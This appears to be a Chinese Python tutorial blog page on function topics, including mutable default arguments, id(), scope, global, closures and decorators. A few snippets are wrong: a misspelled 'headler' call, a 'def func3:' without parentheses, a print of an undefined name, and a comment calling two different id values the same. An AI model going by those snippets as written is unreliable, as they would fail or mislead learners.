<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1,a2=[<span class="number">1</span>,<span class="number">2</span>]</span>):</span></span><br><span class="line">    a2.append(a1)</span><br><span class="line">    <span class="keyword">return</span>(a2)</span><br><span class="line"></span><br><span class="line">v1 = func(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#[1, 2, 10]</span></span><br><span class="line">v2 = func(<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(v2)<span class="comment">#[1, 2, 10, 20]</span></span><br><span class="line">v3 = func(<span class="number">30</span>,[<span class="number">11</span>,<span class="number">22</span>])</span><br><span class="line"><span class="built_in">print</span>(v3)<span class="comment">#[11, 22, 30]</span></span><br><span class="line">v4 = func(<span class="number">40</span>)</span><br><span class="line"><span class="built_in">print</span>(v4)<span class="comment">#[1, 2, 10, 20, 40]</span></span><br></pre></td></tr></table></figure>

<p>深坑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在这里由于先执行的函数，后输出的内容。但是v124都指向的是同一个内存地址，内存地址又发生了一系列的变化，所以就变成了这样。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1,a2=[<span class="number">1</span>,<span class="number">2</span>]</span>):</span></span><br><span class="line">    a2.append(a1)</span><br><span class="line">    <span class="keyword">return</span>(a2)</span><br><span class="line">v1 = func(<span class="number">10</span>)</span><br><span class="line">v2 = func(<span class="number">20</span>)</span><br><span class="line">v3 = func(<span class="number">30</span>,[<span class="number">11</span>,<span class="number">22</span>])</span><br><span class="line">v4 = func(<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#[1, 2, 10, 20, 40]</span></span><br><span class="line"><span class="built_in">print</span>(v2)<span class="comment">#[1, 2, 10, 20, 40]</span></span><br><span class="line"><span class="built_in">print</span>(v3)<span class="comment">#[11, 22, 30]</span></span><br><span class="line"><span class="built_in">print</span>(v4)<span class="comment">#[1, 2, 10, 20, 40]</span></span><br></pre></td></tr></table></figure>



<h3 id="2-5知识补充"><a href="#2-5知识补充" class="headerlink" title="2.5知识补充"></a>2.5知识补充</h3><p>1.**必须放在 *的后面</p>
<p>2.参数和动态参数混合时，动态参数只能放在最后。</p>
<p>3.默认值参数和动态参数同时存在。</p>
<h3 id="2-6参数的补充！"><a href="#2-6参数的补充！" class="headerlink" title="2.6参数的补充！"></a>2.6参数的补充！</h3><h4 id="2-6-1参数内存地址相关【面试题】"><a href="#2-6-1参数内存地址相关【面试题】" class="headerlink" title="2.6.1参数内存地址相关【面试题】"></a>2.6.1参数内存地址相关【面试题】</h4><p>在开始将参数的内存地址相关之前，我们来学习一个技能：</p>
<p>查看某个值在内存中的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">addr = <span class="built_in">id</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(addr)<span class="comment">#2780843422256</span></span><br></pre></td></tr></table></figure>

<p>使用案例，如果两个东西（有些东西是两个东西但是内容是一样的）指向的是同一个地址，那他们就是一个东西。（听君一席话，如听一席话）</p>
<p>注意：函数执行传参时，传递的是内存地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">addr = <span class="built_in">id</span>(v1)</span><br><span class="line"><span class="built_in">print</span>(addr,<span class="built_in">id</span>(addr))<span class="comment">#1971302903920 1971302979760 内存地址是一样的</span></span><br></pre></td></tr></table></figure>

<h4 id="2-6-2内存地址的利用"><a href="#2-6-2内存地址的利用" class="headerlink" title="2.6.2内存地址的利用"></a>2.6.2内存地址的利用</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">data</span>):</span></span><br><span class="line">    data.append(<span class="number">666</span>)</span><br><span class="line">data_list = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]</span><br><span class="line">func(data_list)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[11, 22, 33, 666]</span></span><br><span class="line"><span class="comment">#在这个函数内部修改的是data，但是由于data和data_list的内存地址是一样的，所以修改了data的内容其实也就修改了，data_list。</span></span><br><span class="line"><span class="comment">#但是能修改的必须是可以修改的类型</span></span><br></pre></td></tr></table></figure>



<h2 id="3-函数返回值"><a href="#3-函数返回值" class="headerlink" title="3.函数返回值"></a>3.函数返回值</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (a+b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func(a=<span class="number">1</span>,b=<span class="number">123</span>))<span class="comment">#124</span></span><br></pre></td></tr></table></figure>

<p>注意：函数在碰到return的时候就会立即停止</p>
<h3 id="3-1函数的返回值是内存地址"><a href="#3-1函数的返回值是内存地址" class="headerlink" title="3.1函数的返回值是内存地址"></a>3.1函数的返回值是内存地址</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    data = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(data))<span class="comment">#2831053370624</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">v1 = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(v1))<span class="comment">#2831053370624</span></span><br></pre></td></tr></table></figure>

<p>但是在第二遍执行这个函数的时候，内存地址是会变的，因为在函数执行完之后，其中参数是会被抹去的，重新执行函数又会重新创建一个新的内存地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    data = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">v1 = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(v1))<span class="comment">#1658473428224</span></span><br><span class="line">v2 = func()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(v2))<span class="comment">#1658473713088</span></span><br></pre></td></tr></table></figure>





<h2 id="4-函数和函数名"><a href="#4-函数和函数名" class="headerlink" title="4.函数和函数名"></a>4.函数和函数名</h2><p>函数名其实就是一个变量，这个变量只不过指代的函数而已。</p>
<p>注意：函数必须先定义才能被调用。（解释型语言）（如果是编译型语言就不用。）</p>
<h3 id="4-1函数做元素"><a href="#4-1函数做元素" class="headerlink" title="4.1函数做元素"></a>4.1函数做元素</h3><p>既然函数就相当于是一个变量，那么在列表等元素中是否可以把函数当做元素呢？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">data_list = [<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;func&quot;</span>,func,func()]</span><br><span class="line"><span class="built_in">print</span>(data_list[<span class="number">0</span>])<span class="comment">#dhk</span></span><br><span class="line"><span class="built_in">print</span>(data_list[<span class="number">1</span>])<span class="comment">#func</span></span><br><span class="line"><span class="built_in">print</span>(data_list[<span class="number">2</span>])<span class="comment">#&lt;function func at 0x0000023E7A43F040&gt;</span></span><br><span class="line"><span class="built_in">print</span>(data_list[<span class="number">3</span>])<span class="comment">#123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：函数同时也可被哈希，所以函数名同志也可以当做集合的元素、字典的键。</p>
<p>掌握这个只是之后，对后续的开发有很大的帮助。</p>
<p>案例1：要开发一个类似微信的功能。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_message</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送消息&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_image</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送文件&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#把函数名和其对应的数字存入字典中。</span></span><br><span class="line">func_dict = &#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:send_message,<span class="comment">#因为input获取的是字符串，所以这里也要是字符串</span></span><br><span class="line">    <span class="string">&quot;2&quot;</span>:send_image,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>:send_file&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎使用越江系统&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请选择：1.发送消息2.发送图片3.发送文件&quot;</span>)</span><br><span class="line">choice = <span class="built_in">input</span>(<span class="string">&quot;请输入选择的序号&quot;</span>)</span><br><span class="line">func = func_dict.get(choice)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> func:<span class="comment">#如果键不存在返回none，加个not 就是True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#执行函数</span></span><br><span class="line">    func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>案例2：某个特定情况需要连续执行发消息，发图片，发文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_message</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送消息&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_image</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;发送文件&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#把函数名存入列表中</span></span><br><span class="line">func_List = [send_message,send_image,send_file]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> func_List:<span class="comment">#使用for循环</span></span><br><span class="line">    func()</span><br></pre></td></tr></table></figure>

<h3 id="4-2函数名赋值"><a href="#4-2函数名赋值" class="headerlink" title="4.2函数名赋值"></a>4.2函数名赋值</h3><p>如果我们将函数名重新赋值，那么函数名不在指代函数，而是指代你赋值的那个东西。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="number">123</span>)</span><br><span class="line">func()</span><br><span class="line">func = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(func)</span><br></pre></td></tr></table></figure>

<p>注意：由于函数名被重新定义之后，就会变成新定义的值，所以大家在自定义函数的时候，不要与python内置的函数重合。</p>
<h3 id="4-3函数名做参数和返回值"><a href="#4-3函数名做参数和返回值" class="headerlink" title="4.3函数名做参数和返回值"></a>4.3函数名做参数和返回值</h3><p>1.参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plus</span>(<span class="params">num</span>):</span></span><br><span class="line">   <span class="keyword">return</span> num+<span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">func</span>):</span></span><br><span class="line">    res = func(<span class="number">10</span>)</span><br><span class="line">    msg = <span class="string">f&quot;执行func，并且获取到的结果为：<span class="subst">&#123;res&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    </span><br><span class="line">headler(plus)</span><br></pre></td></tr></table></figure>

<p>2.返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plus</span>(<span class="params">num</span>):</span></span><br><span class="line">   <span class="keyword">return</span> num+<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行handler&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> plus</span><br><span class="line"></span><br><span class="line">result = handler()</span><br><span class="line">data = result(<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<h2 id="5-作用域"><a href="#5-作用域" class="headerlink" title="5.作用域"></a>5.作用域</h2><p>作用域，可以理解为一块空间，这块空间的数据是可以共享的。通俗点来说，作用域就类似于一个房子，房子中的东西归里面所有人共享，其他房子的人无法获取。</p>
<h3 id="5-1函数为作用域"><a href="#5-1函数为作用域" class="headerlink" title="5.1函数为作用域"></a>5.1函数为作用域</h3><p>python以函数为作用域，所以在函数内创建的所有数据，可以在次函数中被使用，无法在其他函数中被使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    age = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>():</span></span><br><span class="line">    age = <span class="number">123</span></span><br><span class="line">    <span class="built_in">print</span>(age)</span><br><span class="line">    </span><br><span class="line">func()</span><br><span class="line">func2()</span><br></pre></td></tr></table></figure>

<h3 id="5-2全局和局部"><a href="#5-2全局和局部" class="headerlink" title="5.2全局和局部"></a>5.2全局和局部</h3><p>一般来说全局变量的变量名都是大写。</p>
<p>在外面定义的变量为全局变量，一般在函数里面定义的变量为局部变量。</p>
<p>在局部作用域调用变量的时候，首先会在自己的作用域寻找变量，如果找不到才会在上一级作用域中寻找变量。</p>
<p>实例1：在局部作用于中读取全局作用域的变量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">NAME = <span class="string">&quot;dhk&quot;</span></span><br><span class="line">AGE = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    asd = <span class="string">&quot;dsa&quot;</span></span><br><span class="line">    AGE = <span class="string">&quot;nihao&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(asd)</span><br><span class="line">    <span class="built_in">print</span>(AGE)</span><br><span class="line">    <span class="built_in">print</span>(NAME)</span><br><span class="line"></span><br><span class="line">func()</span><br><span class="line"><span class="built_in">print</span>(AGE)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出</span></span><br><span class="line"><span class="string">dsa</span></span><br><span class="line"><span class="string">nihao</span></span><br><span class="line"><span class="string">dhk</span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="5-3global关键字"><a href="#5-3global关键字" class="headerlink" title="5.3global关键字"></a>5.3global关键字</h3><p>在局部作用于默认对全局变量只能进行：读取和修改内部元素（可变类型），无法对全局变量进行重新赋值。</p>
<p>但是如果想要在局部作用域中对全局变量重新赋值，则可以基于global关键字实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dhk = <span class="string">&quot;joker&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">global</span> dhk<span class="comment">#将全局变量引入局部作用域</span></span><br><span class="line">    dhk = <span class="string">&quot;动肝&quot;</span></span><br><span class="line">func()</span><br><span class="line"><span class="built_in">print</span>(dhk)<span class="comment">#动肝</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="6-函数的嵌套"><a href="#6-函数的嵌套" class="headerlink" title="6.函数的嵌套"></a>6.函数的嵌套</h2><p>python中以函数为作用域，在作用域中定义的相关数据只能被当前作用于或子作用域使用。</p>
<h3 id="6-1函数在作用域中"><a href="#6-1函数在作用域中" class="headerlink" title="6.1函数在作用域中"></a>6.1函数在作用域中</h3><p>其实，函数也是定义在作用域中的数据，在执行函数的时候，也同样遵循：优先在自己的作用域中寻找，没有则向上寻找</p>
<h3 id="6-2函数定义的位置"><a href="#6-2函数定义的位置" class="headerlink" title="6.2函数定义的位置"></a>6.2函数定义的位置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;外面&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inside</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;里面&quot;</span>)</span><br><span class="line">    func()</span><br><span class="line">func()<span class="comment">#外面</span></span><br><span class="line">inside()<span class="comment">#里面</span></span><br></pre></td></tr></table></figure>

<p>其实，大多数情况下我们都会将函数定义在全局，不会嵌套定义函数。不过，当我们定义一个函数去实现某功能，想要将内部功能拆分成N个函数，又担心这n个函数放在全局会与其他函数冲突时（尤其是多人协同开发），可以选择使用函数的嵌套。</p>
<h3 id="6-3嵌套引发的作用域问题"><a href="#6-3嵌套引发的作用域问题" class="headerlink" title="6.3嵌套引发的作用域问题"></a>6.3嵌套引发的作用域问题</h3><p>基于内存和执行过程分析作用域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;dhk&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    name = <span class="string">&quot;joker&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">    inner()</span><br><span class="line">run()<span class="comment">#执行函数就创建了一个作用域.</span></span><br><span class="line"><span class="comment">#输出joker</span></span><br></pre></td></tr></table></figure>

<h2 id="7-闭包"><a href="#7-闭包" class="headerlink" title="7.闭包"></a>7.闭包</h2><p>简而言之就是讲数据封装在一个包中，使用时再去里面取。（本质上，闭包是基于函数嵌套搞出来一个中特殊嵌套）</p>
<p>闭包应用场景1：封装数据防止污染全局</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;dhk&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">age</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(name,age)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">func2</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(name,age)</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">func3</span>:</span></span><br><span class="line">            <span class="built_in">print</span>(name,age)</span><br></pre></td></tr></table></figure>

<p>闭包应用场景2：封装数据到一个包里，使用时再取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">v1 = task(<span class="number">11</span>)<span class="comment">#创建了一个空间储存了arg，这个时候的v1就是inner</span></span><br><span class="line">v2 = task(<span class="number">22</span>)</span><br><span class="line">v1()<span class="comment">#11</span></span><br><span class="line">v2()<span class="comment">#22</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">inner_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>]:</span><br><span class="line">    inner_list.append(task(val))<span class="comment">#虽然返回的都是inner但是每一个inner的包都是不一样的</span></span><br><span class="line"></span><br><span class="line">inner_list[<span class="number">0</span>]()<span class="comment">#11</span></span><br><span class="line">inner_list[<span class="number">1</span>]()<span class="comment">#22</span></span><br><span class="line">inner_list[<span class="number">2</span>]()<span class="comment">#33</span></span><br></pre></td></tr></table></figure>

<h2 id="8-装饰器"><a href="#8-装饰器" class="headerlink" title="8.装饰器"></a>8.装饰器</h2><p>现在给你一个函数，在不修改函数源码的前提下，实现在函数执行前和执行后分别输入before和after</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">result = func()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h3 id="8-1第一回合"><a href="#8-1第一回合" class="headerlink" title="8.1第一回合"></a>8.1第一回合</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"><span class="comment">#创建了一个闭包，维护了origin内存地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">origin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;before&quot;</span>)</span><br><span class="line">        res = origin()<span class="comment">#调用原来func的函数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;after&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">func = outer(func)<span class="comment">#在这里func被重新定义为inner函数,原来的func则被封存在origin的内存地址中</span></span><br><span class="line">result = func()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出</span></span><br><span class="line"><span class="string">before</span></span><br><span class="line"><span class="string">我是一个func函数</span></span><br><span class="line"><span class="string">after</span></span><br><span class="line"><span class="string">(11, 22, 33, 44)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2第二回合"><a href="#8-2第二回合" class="headerlink" title="8.2第二回合"></a>8.2第二回合</h3><p>python中支持特殊语法，在某个函数上方使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@函数名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxx</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#python内部会自动执行 函数名（xxx），执行完之后，在将结果赋值给xxx。</span></span><br><span class="line"><span class="comment">#xxx = 函数名（xxx）</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">origin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;before&quot;</span>)</span><br><span class="line">        res = origin()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;after&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@outer </span><span class="comment">#func = outer(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">reslut = func()</span><br><span class="line"><span class="built_in">print</span>(reslut)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">before</span></span><br><span class="line"><span class="string">我是一个func函数</span></span><br><span class="line"><span class="string">after</span></span><br><span class="line"><span class="string">(11, 22, 33, 44)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-3第三回合"><a href="#8-3第三回合" class="headerlink" title="8.3第三回合"></a>8.3第三回合</h3><p>更改需求，现在有三个fanc函数，func1，func2，func3，都在前面和后面分别输出before 和after</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">origin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;before&quot;</span>)</span><br><span class="line">        res = origin()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;after&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@outer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func1函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"><span class="meta">@outer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func2函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"><span class="meta">@outer</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func3</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func3函数&quot;</span>)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>

<h3 id="8-4支持优化n个参数"><a href="#8-4支持优化n个参数" class="headerlink" title="8.4支持优化n个参数"></a>8.4支持优化n个参数</h3><p>如果函数存在参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>(<span class="params">origin</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;before&quot;</span>)</span><br><span class="line">        res = origin(*args,**kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;after&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@outer </span><span class="comment">#func = outer(func)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是一个func函数&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(a1)</span><br><span class="line">    value = (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">reslut = func(<span class="number">123</span>)</span><br><span class="line"><span class="built_in">print</span>(reslut)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">before</span></span><br><span class="line"><span class="string">我是一个func函数</span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">after</span></span><br><span class="line"><span class="string">(11, 22, 33, 44)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>装饰器实例</p>
